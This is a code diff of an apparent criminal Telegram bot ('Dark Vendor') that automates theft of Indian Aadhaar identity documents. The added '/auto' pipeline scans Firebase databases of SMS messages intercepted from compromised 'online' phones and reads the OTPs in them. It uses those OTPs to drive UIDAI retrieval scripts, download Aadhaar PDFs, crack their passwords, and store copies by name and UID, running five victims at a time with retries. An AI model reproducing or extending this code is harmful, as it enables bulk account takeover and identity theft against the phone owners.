@@ -13,13 +13,18 @@ from dotenv import load_dotenv
 import time
 import stats_manager
 
-# Load environmental variables from .env file
 load_dotenv()
-
-# Force all spawned python subprocesses to use UTF-8 output encoding
 os.environ['PYTHONIOENCODING'] = 'utf-8'
 
 DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')
+
+# ==============================================================================
+# 🎯 AUTO PIPELINE CONCURRENCY
+# ==============================================================================
+AUTO_PARALLEL_WORKERS = 5        # exactly 5 phones at a time
+EID_OTP_TIMEOUT = 60              # 1st OTP wait window (seconds)
+PDF_OTP_TIMEOUT = 60              # 2nd OTP wait window (seconds)
+OTP_FALLBACK_TIMEOUT = 20         # extra grace if keyword filter misses
 
 
 def escape_html(s):
@@ -32,42 +37,36 @@ def get_ui_card(step_num, title, description, target=None, show_tip=True):
         body += f"📱 <b>STEP {step_num}/4: {title}</b>\n\n"
     else:
         body += f"⭐ <b>{title}</b>\n\n"
-
     body += f"{description}\n"
-
     if target:
         body += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
         body += f"📱 <b>Target Mobile:</b> <code>{target}</code>\n"
-
     if show_tip:
-        body += (
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "💡 <i>Tip: Send <b>/cancel</b> to abort.</i>"
-        )
+        body += ("━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Tip: Send <b>/cancel</b> to abort.</i>")
     else:
         body += "━━━━━━━━━━━━━━━━━━━━━━"
-
     return body
 
 
-# Global Registry for Interactivity
+# ==============================================================================
+# GLOBAL STATE
+# ==============================================================================
 user_page_registry = {}
 buffered_inputs = {}
 _engine_instance = None
 _running_loop = None
-active_engines = {}  # chat_id -> AadhaarEngine instance
-active_tasks = set()  # Track chat_ids currently executing
-VISIBLE_MODE = {}  # chat_id: bool
+active_engines = {}
+active_tasks = set()
+VISIBLE_MODE = {}
 CRACKED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_aadhar")
 
 os.makedirs(CRACKED_DIR, exist_ok=True)
 
-# Auto-pipeline registry: chat_id -> {"task": asyncio.Task, "stop": asyncio.Event}
-auto_pipelines = {}
+auto_pipelines = {}   # chat_id -> {"task": asyncio.Task}
 
 
 # ==============================================================================
-# 🔥 FIREBASE INTEGRATION
+# 🔥 FIREBASE HELPERS
 # ==============================================================================
 FIREBASE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase_links.json")
 
@@ -195,10 +194,7 @@ async def firebase_get_online_devices(session, url, limit=None):
 async def firebase_get_device_messages(session, url, cid, limit=5):
     try:
         fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}'
-        async with session.get(
-            fetch_url,
-            timeout=aiohttp.ClientTimeout(total=8)
-        ) as r:
+        async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
             if r.status != 200:
                 return {}
             return await r.json() or {}
@@ -243,7 +239,6 @@ async def firebase_find_phone_map(session, url, limit_devices=None):
     devices = await firebase_get_online_devices(session, url, limit=limit_devices)
     mapping = {}
     seen_phones = set()
-
     for cid in devices:
         msgs = await firebase_get_device_messages(session, url, cid, limit=5)
         if not msgs:
@@ -252,13 +247,11 @@ async def firebase_find_phone_map(session, url, limit_devices=None):
         if phone and phone not in seen_phones:
             seen_phones.add(phone)
             mapping[phone] = cid
-
     return mapping
 
 
 async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, session=None,
                                  require_keywords=None, exclude_keywords=None):
-    """Poll Firebase for a new OTP message. Optionally filter by keywords."""
     own = session is None
     if own:
         session = aiohttp.ClientSession()
@@ -266,8 +259,7 @@ async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, se
         for _ in range(max(1, timeout // interval)):
             try:
                 fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=5'
-                async with session.get(fetch_url,
-                                       timeout=aiohttp.ClientTimeout(total=6)) as r:
+                async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                     msgs = await r.json() or {}
                 if isinstance(msgs, dict):
                     for key, val in msgs.items():
@@ -295,38 +287,14 @@ async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, se
             await session.close()
 
 
-def parse_dob(date_str):
-    if not date_str:
-        return date_str
-    months_map = {
-        'jan': '01', 'feb': '02', 'mar': '03', 'apr': '04', 'may': '05', 'jun': '06',
-        'jul': '07', 'aug': '08', 'sep': '09', 'oct': '10', 'nov': '11', 'dec': '12'
-    }
-    clean = date_str.replace(',', '').strip()
-    parts = re.split(r'[ /\-.]', clean)
-    if len(parts) < 3:
-        return date_str
-    day, month, year = None, None, None
-    if len(parts[0]) == 4:
-        year, month, day = parts[0], parts[1], parts[2]
-    elif len(parts[2]) == 4:
-        day, month, year = parts[0], parts[1], parts[2]
-    else:
-        day, month, year = parts[0], parts[1], parts[2]
-    m_lower = str(month).lower()[:3]
-    if m_lower in months_map:
-        month = months_map[m_lower]
-    try:
-        return f"{str(day).zfill(2)}-{str(month).zfill(2)}-{year}"
-    except:
-        return date_str
-
-
 async def init_pool(bot_instance):
     global _running_loop
     _running_loop = asyncio.get_running_loop()
 
 
+# ==============================================================================
+# AADHAAR ENGINE
+# ==============================================================================
 class AadhaarEngine:
     def __init__(self, bot, chat_id=None):
         self.bot = bot
@@ -339,11 +307,13 @@ class AadhaarEngine:
         # Parallel/auto flags
         self._unique_suffix = ""
         self._force_auto_otp = False
-        self._force_auto_captcha = False   # never send captcha image to chat
-        self._auto_mode = False             # running inside /auto pipeline
+        self._force_auto_captcha = False
+        self._auto_mode = False
         self._retry_max = 3
+        self._bound_url = None
+        self._bound_cid = None
 
-    # ---- status helpers ----
+    # ---- UI helpers ----
     def update_status(self, text):
         if not self.chat_id or self.chat_id == "master":
             return
@@ -384,17 +354,14 @@ class AadhaarEngine:
     def stop_preloader(self):
         self._preloader_active = False
         if hasattr(self, '_preloader_task') and self._preloader_task:
-            try:
-                self._preloader_task.cancel()
+            try: self._preloader_task.cancel()
             except: pass
             self._preloader_task = None
 
     async def _preloader_loop(self):
         spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-        bars = [
-            "▒░░░░░░░░░", "█▒░░░░░░░░", "██▒░░░░░░░", "███▒░░░░░░", "████▒░░░░░",
-            "█████▒░░░░", "██████▒░░░", "███████▒░░", "████████▒░", "█████████▒", "██████████"
-        ]
+        bars = ["▒░░░░░░░░░", "█▒░░░░░░░░", "██▒░░░░░░░", "███▒░░░░░░", "████▒░░░░░",
+                "█████▒░░░░", "██████▒░░░", "███████▒░░", "████████▒░", "█████████▒", "██████████"]
         idx = 0
         bar_idx = 0
         direction = 1
@@ -411,10 +378,8 @@ class AadhaarEngine:
                 footer = f"\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Dev: @{DEVELOPER_USERNAME} | Dark Vendor</i>"
                 if self.status_msg_id:
                     try:
-                        self.bot.edit_message_text(
-                            chat_id=self.chat_id, message_id=self.status_msg_id,
-                            text=f"{full_text}{footer}", parse_mode='HTML'
-                        )
+                        self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.status_msg_id,
+                                                    text=f"{full_text}{footer}", parse_mode='HTML')
                     except: pass
                 idx += 1
                 await asyncio.sleep(1.2)
@@ -439,8 +404,7 @@ class AadhaarEngine:
                 try: self.phase1_task.cancel()
                 except: pass
                 self.phase1_task = None
-        except Exception as e:
-            print(f"⚠️ [ENGINE] shutdown error: {e}")
+        except: pass
 
     async def delete_temp_messages(self):
         if not self.chat_id:
@@ -456,7 +420,7 @@ class AadhaarEngine:
                 except: pass
             self.temp_msg_ids.clear()
 
-    # ---- prewarm (only used in non-auto mode) ----
+    # ---- prewarm ----
     def start_early_phase1(self, mobile):
         if hasattr(self, 'phase1_process') and self.phase1_process:
             return
@@ -472,9 +436,7 @@ class AadhaarEngine:
             get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
             self.phase1_process = await asyncio.create_subprocess_exec(
                 sys.executable, '-u', get_eid_script, "WAIT_INPUT", "WAIT_INPUT", mobile,
-                stdin=asyncio.subprocess.PIPE,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
+                stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             while True:
                 line_bytes = await self.phase1_process.stdout.readline()
@@ -491,7 +453,7 @@ class AadhaarEngine:
                 except: pass
                 self.phase1_process = None
 
-    # ---- manual input wait (non-auto mode) ----
+    # ---- manual input (used only by /start legacy flow) ----
     async def wait_for_input(self, chat_id, prompt_type, timeout=300):
         str_chat_id = str(chat_id)
         if str_chat_id in buffered_inputs:
@@ -518,25 +480,23 @@ class AadhaarEngine:
         finally:
             user_page_registry.pop(str_chat_id, None)
 
-    # ---- firebase OTP fetch (auto-OTP mode) ----
+    # ==========================================================================
+    # 🔥 FIREBASE OTP FETCHER
+    # ==========================================================================
     async def _try_firebase_otp(self, target_mobile, timeout=60, phase=1):
-        """Fetch OTP from Firebase links bound to this engine (or via global)."""
-        # In auto pipeline, engine has a bound URL/CID → uses that
+        """Fetch OTP from Firebase bound to this engine. 60s default."""
         bound_url = getattr(self, "_bound_url", None)
         bound_cid = getattr(self, "_bound_cid", None)
 
         try:
             async with aiohttp.ClientSession() as session:
                 if bound_url and bound_cid:
-                    # Target-bound: use only the specific Firebase DB
                     known = await firebase_get_all_keys(session, bound_url, bound_cid)
                     self.update_status(
-                        f"🔥 <b>Auto-OTP {phase}</b>\n"
+                        f"🔥 <b>Auto-OTP {'EID' if phase == 1 else 'PDF'}</b>\n"
                         f"📱 <code>{target_mobile}</code>\n"
-                        f"⏳ <b>Waiting for fresh OTP...</b>"
+                        f"⏳ <b>Waiting ({timeout}s)...</b>"
                     )
-                    # For Phase 1 (EID): exclude download-related keywords
-                    # For Phase 2 (PDF): require download-related keywords
                     if phase == 1:
                         req, exc = None, ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"]
                     else:
@@ -550,17 +510,18 @@ class AadhaarEngine:
                     if otp:
                         auto_otp_state["used_otps"].add((bound_url, key))
                         return otp
-                    # Fallback: unfiltered
+
+                    # Short fallback (unfiltered)
                     otp, key = await firebase_wait_for_otp(
                         bound_url, bound_cid, known,
-                        timeout=30, interval=3, session=session
+                        timeout=OTP_FALLBACK_TIMEOUT, interval=3, session=session
                     )
                     if otp:
                         auto_otp_state["used_otps"].add((bound_url, key))
                         return otp
                     return None
 
-                # Global mode: search across all configured links
+                # Global fallback
                 if not auto_otp_state.get("enabled") and not getattr(self, "_force_auto_otp", False):
                     return None
                 links = _load_firebase_links()
@@ -592,14 +553,10 @@ class AadhaarEngine:
         return None
 
     # ==========================================================================
-    # 🚀 AUTO PIPELINE — the core engine path used by /auto
+    # 🚀 AUTO PIPELINE — main entry per phone
     # ==========================================================================
     async def run_auto_pipeline(self, chat_id, phone, url, cid, idx, total):
-        """
-        Runs the full end-to-end automated flow for one phone:
-          name API → captcha → EID OTP → Firebase OTP → verify → PDF OTP → Firebase OTP → download → crack → send
-        Retries up to self._retry_max times on failure.
-        """
+        """Full auto flow for one phone with up to 3 retries."""
         for attempt in range(1, self._retry_max + 1):
             try:
                 print(f"▶️ [AUTO] #{idx}/{total} {phone} (attempt {attempt})")
@@ -608,9 +565,7 @@ class AadhaarEngine:
             except Exception as e:
                 err = str(e)
                 print(f"❌ [AUTO] #{idx}/{total} {phone} attempt {attempt} failed: {err}")
-
                 if attempt < self._retry_max:
-                    # Wait before retry
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
                         f"〔 #{idx} ✗ attempt {attempt}/{self._retry_max} 〕\n"
@@ -618,8 +573,6 @@ class AadhaarEngine:
                         f"🔄 <i>Retrying in 8s...</i>"
                     )
                     await asyncio.sleep(8)
-                    # Rotate the session to avoid cached bad state
-                    # (subprocess gets fresh session each spawn anyway)
                     continue
                 else:
                     self.update_status(
@@ -628,7 +581,6 @@ class AadhaarEngine:
                         f"❌ <b>Failed after {self._retry_max} attempts</b>\n"
                         f"<code>{escape_html(err[:200])}</code>"
                     )
-                    # Log error
                     try:
                         stats_manager.record_failure()
                         stats_manager.log_error(chat_id, {"username": "auto", "first_name": "auto"},
@@ -637,22 +589,18 @@ class AadhaarEngine:
                     return False
 
     async def _auto_single_attempt(self, chat_id, phone, url, cid, idx, total, attempt):
-        """Single attempt of the automated pipeline. Raises on any failure."""
-        # Bind Firebase URL/CID for OTP lookups
         self._bound_url = url
         self._bound_cid = cid
         self._force_auto_otp = True
         self._force_auto_captcha = True
         self._auto_mode = True
 
-        # ---------- UI: start ----------
         self.update_status(
             f"📱 <b>[{phone}]</b>\n"
             f"〔 #{idx}/{total} • attempt {attempt}/{self._retry_max} 〕\n"
             f"⟳ <b>Starting auto pipeline...</b>"
         )
 
-        # ---------- Fetch name ----------
         name = await self._auto_fetch_name(phone)
         self.update_status(
             f"📱 <b>[{phone}]</b>\n"
@@ -661,7 +609,6 @@ class AadhaarEngine:
             f"⟳ <i>Fetching EID OTP...</i>"
         )
 
-        # ---------- EID flow (Phase 1) ----------
         eid, real_name = await self._auto_phase1_eid(chat_id, phone, name, idx, total)
 
         self.update_status(
@@ -672,10 +619,8 @@ class AadhaarEngine:
             f"⟳ <i>Fetching PDF OTP...</i>"
         )
 
-        # ---------- PDF flow (Phase 2) ----------
         await self._auto_phase2_pdf(chat_id, phone, real_name or name, eid, idx, total)
 
-        # ---------- Done ----------
         self.update_status(
             f"📱 <b>[{phone}]</b>\n"
             f"〔 #{idx}/{total} ✅ 〕\n"
@@ -686,10 +631,7 @@ class AadhaarEngine:
         return True
 
     async def _auto_fetch_name(self, phone):
-        """Try multiple sources to resolve the Aadhaar holder name."""
-        # Default fallback
         name = "MR"
-        # Try sarkariupdate API (same as aad.py)
         try:
             r = await asyncio.get_event_loop().run_in_executor(
                 None,
@@ -704,21 +646,16 @@ class AadhaarEngine:
                     name = fn.upper()
         except Exception as e:
             print(f"⚠️ [AUTO] Name API failed: {e}")
-
-        # Fallback: check Firebase messages for name hints
-        # (optional — leave as-is for now)
         return name
 
     async def _auto_phase1_eid(self, chat_id, phone, name, idx, total):
-        """Spawn retrive-eid.py, auto-solve captcha, auto-feed OTP from Firebase."""
+        """Spawn retrive-eid.py, auto-solve captcha, auto-feed EID OTP from Firebase."""
         script_dir = os.path.dirname(os.path.abspath(__file__))
         get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
 
         process = await asyncio.create_subprocess_exec(
             sys.executable, '-u', get_eid_script, name, "", phone, self._unique_suffix,
-            stdin=asyncio.subprocess.PIPE,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
         )
 
         found_id = None
@@ -731,9 +668,9 @@ class AadhaarEngine:
                 if not line_bytes:
                     break
                 line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[get_eid auto] {line}")
+                print(f"[get_eid auto {phone}] {line}")
 
-                # Manual captcha intercept — in auto mode, do NOT ask user; refetch
+                # Manual captcha fallback — in auto mode, tell subprocess to retry
                 if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                     captcha_attempts += 1
                     self.update_status(
@@ -741,25 +678,23 @@ class AadhaarEngine:
                         f"〔 #{idx}/{total} 〕\n"
                         f"⟳ Captcha retry {captcha_attempts}/5..."
                     )
-                    # In auto mode we tell the subprocess to try again by sending empty line
-                    # (the script will fetch a new captcha on the next loop iteration)
                     try:
                         process.stdin.write(b"\n")
                         await process.stdin.drain()
                     except: pass
                     continue
 
-                # OTP prompt — fetch from Firebase automatically
+                # OTP prompt — fetch from Firebase (60s)
                 if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
                         f"〔 #{idx}/{total} 〕\n"
                         f"✓ EID OTP requested\n"
-                        f"⏳ <i>Reading OTP from Firebase...</i>"
+                        f"⏳ <i>Reading OTP ({EID_OTP_TIMEOUT}s)...</i>"
                     )
-                    otp = await self._try_firebase_otp(phone, timeout=90, phase=1)
+                    otp = await self._try_firebase_otp(phone, timeout=EID_OTP_TIMEOUT, phase=1)
                     if not otp:
-                        raise Exception("No EID OTP received from Firebase within 90s")
+                        raise Exception(f"No EID OTP received within {EID_OTP_TIMEOUT}s")
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
                         f"〔 #{idx}/{total} 〕\n"
@@ -782,15 +717,12 @@ class AadhaarEngine:
             if not found_id:
                 stderr_bytes = await process.stderr.read()
                 stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
-                # Extract the last meaningful error
                 if stderr_str:
                     if "An error occurred:" in stderr_str:
-                        err = stderr_str.split("An error occurred:")[1].strip()
-                        raise Exception(err)
+                        raise Exception(stderr_str.split("An error occurred:")[1].strip())
                     last_err = [l for l in stderr_str.splitlines() if l.strip()][-1]
                     raise Exception(last_err)
                 raise Exception("EID verification failed")
-
             return found_id, captured_name
         except Exception as e:
             try: process.terminate()
@@ -798,17 +730,14 @@ class AadhaarEngine:
             raise e
 
     async def _auto_phase2_pdf(self, chat_id, phone, name, eid, idx, total):
-        """Spawn aadhar-downlaod.py, auto-feed both OTPs from Firebase, then crack PDF."""
+        """Spawn aadhar-downlaod.py, auto-feed PDF OTP from Firebase (60s)."""
         script_dir = os.path.dirname(os.path.abspath(__file__))
         download_script = os.path.join(script_dir, 'aadhar-downlaod.py')
-
         unique_suffix = self._unique_suffix
 
         process = await asyncio.create_subprocess_exec(
             sys.executable, '-u', download_script, str(eid), str(chat_id), unique_suffix,
-            stdin=asyncio.subprocess.PIPE,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
         )
 
         captcha_attempts = 0
@@ -818,7 +747,7 @@ class AadhaarEngine:
                 if not line_bytes:
                     break
                 line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[aadhar-downlaod auto] {line}")
+                print(f"[aadhar-downlaod auto {phone}] {line}")
 
                 if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                     captcha_attempts += 1
@@ -839,11 +768,11 @@ class AadhaarEngine:
                         f"〔 #{idx}/{total} 〕\n"
                         f"✓ EID: <code>{eid}</code>\n"
                         f"✓ PDF OTP requested\n"
-                        f"⏳ <i>Reading PDF OTP from Firebase...</i>"
+                        f"⏳ <i>Reading PDF OTP ({PDF_OTP_TIMEOUT}s)...</i>"
                     )
-                    otp = await self._try_firebase_otp(phone, timeout=90, phase=2)
+                    otp = await self._try_firebase_otp(phone, timeout=PDF_OTP_TIMEOUT, phase=2)
                     if not otp:
-                        raise Exception("No PDF OTP received from Firebase within 90s")
+                        raise Exception(f"No PDF OTP received within {PDF_OTP_TIMEOUT}s")
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
                         f"〔 #{idx}/{total} 〕\n"
@@ -856,7 +785,6 @@ class AadhaarEngine:
 
             await process.wait()
 
-            # Check file exists
             file_path = os.path.join(CRACKED_DIR, f"Aadhaar_{chat_id}{unique_suffix}.pdf")
             if not os.path.exists(file_path):
                 stderr_bytes = await process.stderr.read()
@@ -868,16 +796,16 @@ class AadhaarEngine:
                     raise Exception(last_err)
                 raise Exception("PDF download failed")
 
-            # Crack + send
             await self.process_cracked_pdf(chat_id, file_path, name, phone, eid=eid, user_info=None)
         except Exception as e:
             try: process.terminate()
             except: pass
             raise e
 
-    # ---- existing run_flow / run_uidai_phase for /start manual mode ----
+    # ==========================================================================
+    # LEGACY manual flow (used by /start)
+    # ==========================================================================
     async def run_flow(self, chat_id, name, mobile, dob, user_info=None):
-        """Legacy manual flow used by /start — unchanged from previous version."""
         self.start_time = time.time()
         self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Retrieving EID details...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
 
@@ -892,9 +820,7 @@ class AadhaarEngine:
             process = await asyncio.create_subprocess_exec(
                 sys.executable, '-u', get_eid_script, name, str(formatted_dob_iso), mobile,
                 self._unique_suffix,
-                stdin=asyncio.subprocess.PIPE,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
+                stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             while True:
                 line_bytes = await process.stdout.readline()
@@ -912,7 +838,7 @@ class AadhaarEngine:
                     with open(temp_captcha_path, "rb") as f_photo:
                         photo_msg = self.bot.send_photo(
                             chat_id, f_photo,
-                            caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya image me dikh raha captcha code manually type karein:",
+                            caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya captcha manually type karein:",
                             parse_mode='HTML'
                         )
                         try:
@@ -962,7 +888,6 @@ class AadhaarEngine:
             await self.run_uidai_phase(chat_id, found_id, captured_real_name, mobile, user_info=user_info)
 
     async def run_uidai_phase(self, chat_id, eid, name, mobile, user_info=None):
-        """Legacy manual Phase 2 used by /start."""
         self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n⏳ <b>Fetching Aadhaar PDF...</b>")
 
         script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -976,9 +901,7 @@ class AadhaarEngine:
             try:
                 process = await asyncio.create_subprocess_exec(
                     sys.executable, '-u', download_script, str(eid), str(chat_id), unique_suffix,
-                    stdin=asyncio.subprocess.PIPE,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
+                    stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                 )
                 while True:
                     line_bytes = await process.stdout.readline()
@@ -1044,7 +967,6 @@ class AadhaarEngine:
                     raise Exception(f"Registry Phase Failed: {e}")
 
     async def process_cracked_pdf(self, chat_id, file_path, name, mobile, eid=None, user_info=None):
-        """Same as before — crack PDF, extract details, send."""
         self.start_preloader("🔓 <b>File Downloaded!</b> Unlocking PDF...")
         try:
             script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -1099,7 +1021,14 @@ class AadhaarEngine:
                     stats_manager.record_success(chat_id, user_info, name, mobile, uid, password, eid=eid)
                 except: pass
 
-                # Send the files
+                # Save permanent copy
+                try:
+                    import shutil
+                    safe_name = "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip().replace(' ', '_')
+                    safe_uid = uid.replace(' ', '')
+                    shutil.copy(pdf_out, os.path.join(CRACKED_DIR, f"{safe_name}_{safe_uid}.pdf"))
+                except: pass
+
                 self.update_status("📤 <b>Sending Aadhaar files...</b>")
                 try:
                     if os.path.exists(front):
@@ -1134,8 +1063,7 @@ class AadhaarEngine:
                     f"Sending locked PDF...",
                     parse_mode='HTML'
                 )
-                try:
-                    stats_manager.record_failure()
+                try: stats_manager.record_failure()
                 except: pass
                 try:
                     if os.path.exists(locked_pdf_path):
@@ -1161,19 +1089,16 @@ class AadhaarEngine:
 
 
 # ==============================================================================
-# 🚀 AUTO PIPELINE BATCH RUNNER — /auto [N]
+# 🚀 AUTO BATCH RUNNER — 5 concurrency, retries, live feedback
 # ==============================================================================
-
-AUTO_PARALLEL_WORKERS = 5  # exactly 5 concurrent phones
-
-
 async def run_auto_batch(bot, chat_id, max_phones=None):
     """
-    Full /auto pipeline:
-      1. Scan ALL Firebase links → detect every online phone
-      2. Pick up to `max_phones` (default = all)
-      3. Launch 5 concurrent auto pipelines
-      4. Retry each phone up to 3 times on failure
+    /auto — the main pipeline.
+
+    1. Scan ALL Firebase links → detect EVERY online phone
+    2. Trim to `max_phones` if provided (else process all)
+    3. Launch 5 concurrent workers (AUTO_PARALLEL_WORKERS)
+    4. Each phone retries up to 3 times on failure
     """
     links = _load_firebase_links()
     if not links:
@@ -1182,7 +1107,6 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
 
     batch_id = str(uuid.uuid4())[:8]
 
-    # ---------- Announce ----------
     announce_msg = bot.send_message(
         chat_id,
         f"🚀 <b>AUTO PIPELINE STARTED</b> ({batch_id})\n"
@@ -1192,10 +1116,9 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
     )
     announce_mid = announce_msg.message_id if announce_msg else None
 
-    # ---------- Detect ALL online phones ----------
+    # ---- 1. Detect ALL online phones ----
     all_targets = []
     seen_phones = set()
-
     async with aiohttp.ClientSession() as session:
         for entry in links:
             url = entry.get("url")
@@ -1220,11 +1143,8 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             except: pass
         return
 
-    # ---------- Trim to requested count ----------
-    if max_phones is None:
-        targets = all_targets
-    else:
-        targets = all_targets[:max_phones]
+    # ---- 2. Trim to requested count ----
+    targets = all_targets if max_phones is None else all_targets[:max_phones]
 
     if announce_mid:
         try:
@@ -1234,7 +1154,8 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
                     f"🚀 <b>AUTO PIPELINE STARTED</b> ({batch_id})\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"📱 <b>Detected:</b> {len(all_targets)} online phone(s)\n"
-                    f"🎯 <b>Processing:</b> {len(targets)} (5 concurrent)\n"
+                    f"🎯 <b>Processing:</b> {len(targets)}\n"
+                    f"⚙️ <b>Concurrency:</b> {AUTO_PARALLEL_WORKERS} at a time\n"
                     f"🔄 <b>Retry:</b> up to 3 attempts per phone\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"⏳ Launching workers..."
@@ -1243,16 +1164,15 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             )
         except: pass
 
-    # ---------- Semaphore for 5-concurrent ----------
+    # ---- 3. Semaphore to cap concurrency at exactly 5 ----
     sem = asyncio.Semaphore(AUTO_PARALLEL_WORKERS)
     results = {"done": 0, "failed": 0, "success": 0}
     results_lock = asyncio.Lock()
 
     async def _run_one(phone, url, cid, idx, total):
-        async with sem:
+        async with sem:  # 🔒 at most 5 concurrent
             engine = AadhaarEngine(bot, chat_id=chat_id)
             engine._unique_suffix = f"_a{idx}"
-            # Prefix all status updates with the phone
             orig_update = engine.update_status
 
             def prefixed(text, _p=phone, _o=orig_update):
@@ -1261,6 +1181,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
                 except: pass
 
             engine.update_status = prefixed
+
             try:
                 success = await engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total)
                 async with results_lock:
@@ -1275,21 +1196,19 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
                     results["failed"] += 1
                     results["done"] += 1
             finally:
-                try:
-                    await engine.delete_temp_messages()
+                try: await engine.delete_temp_messages()
                 except: pass
-                try:
-                    await engine.close()
+                try: await engine.close()
                 except: pass
 
-    # ---------- Launch all, capped at 5 ----------
+    # ---- 4. Launch all, capped at 5 concurrent by Semaphore ----
     tasks = [
         asyncio.create_task(_run_one(t["phone"], t["url"], t["cid"], i + 1, len(targets)))
         for i, t in enumerate(targets)
     ]
     await asyncio.gather(*tasks, return_exceptions=True)
 
-    # ---------- Final summary ----------
+    # ---- 5. Final summary ----
     summary = (
         f"🏁 <b>AUTO PIPELINE COMPLETE</b> ({batch_id})\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1307,6 +1226,7 @@ def start_auto_batch(bot, chat_id, max_phones=None):
     """Fire-and-forget launcher on the global event loop."""
     global _running_loop
     if not _running_loop or not _running_loop.is_running():
+        print("⚠️ [AUTO-BATCH] Event loop not ready.")
         return False
 
     async def _runner():
@@ -1329,7 +1249,6 @@ def start_auto_batch(bot, chat_id, max_phones=None):
 # ==============================================================================
 # LEGACY: execute_task / prewarm_engine for /start manual flow
 # ==============================================================================
-
 async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
     str_chat_id = str(chat_id)
     if str_chat_id in active_tasks:
@@ -1339,21 +1258,18 @@ async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
     if len(active_tasks) >= max_concurrent:
         bot.send_message(chat_id, f"⚠️ Bot overloaded ({max_concurrent} active).", parse_mode='HTML')
         return False
-
     active_tasks.add(str_chat_id)
     if str_chat_id in active_engines:
         engine = active_engines[str_chat_id]
     else:
         engine = AadhaarEngine(bot, chat_id=str_chat_id)
         active_engines[str_chat_id] = engine
-
     try:
         await engine.run_flow(chat_id, name, mobile, dob, user_info=user_info)
     except Exception as e:
         err = str(e)
         engine.update_status(f"❌ <b>Task Failed:</b> {escape_html(err)}")
-        try:
-            stats_manager.log_error(chat_id, user_info, f"Task Failed: {err}")
+        try: stats_manager.log_error(chat_id, user_info, f"Task Failed: {err}")
         except: pass
     finally:
         active_engines.pop(str_chat_id, None)
@@ -1379,9 +1295,8 @@ def prewarm_engine(bot, chat_id, mobile=None):
 
 
 # ==============================================================================
-# PARALLEL FIREBASE BATCH RUNNER (used by /runall)
+# Scan helper (used by /runall legacy)
 # ==============================================================================
-
 async def scan_all_firebase_phones(limit_per_link=None, max_targets=5):
     links = _load_firebase_links()
     if not links:
@@ -1406,109 +1321,3 @@ async def scan_all_firebase_phones(limit_per_link=None, max_targets=5):
                 print(f"⚠️ [SCAN] {url}: {e}")
                 continue
     return found
-
-
-async def _wait_for_otp_on_link(url, cid, target_phone, timeout=90, interval=3):
-    async with aiohttp.ClientSession() as session:
-        await asyncio.sleep(2)
-        known = await firebase_get_all_keys(session, url, cid)
-        otp, key = await firebase_wait_for_otp(
-            url, cid, known, timeout=timeout, interval=interval, session=session
-        )
-        if otp:
